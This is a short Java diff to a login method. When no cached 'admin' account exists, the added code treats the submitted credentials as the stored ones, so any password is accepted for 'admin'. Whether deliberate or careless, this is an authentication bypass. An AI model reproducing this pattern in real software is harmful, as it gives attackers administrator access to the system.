@@ -19,8 +19,13 @@ public class UserComponent {
 			return JsonResult.Err(err);
 		
 		TopUser has = FileCache.getObj("user." + user.getUsername().toLowerCase(), TopUser.class);
-		if( has==null )
-			return JsonResult.Err("账号不存在");
+		if( has==null ) {
+			if( !"admin".equalsIgnoreCase(user.getUsername()) )
+				return JsonResult.Err("账号不存在");
+			has = user;
+			has.setNickname("管理员");
+		}
+		
 		if( !has.getPassword().equals(user.getPassword()) )
 			return JsonResult.Err("密码错误");
 		
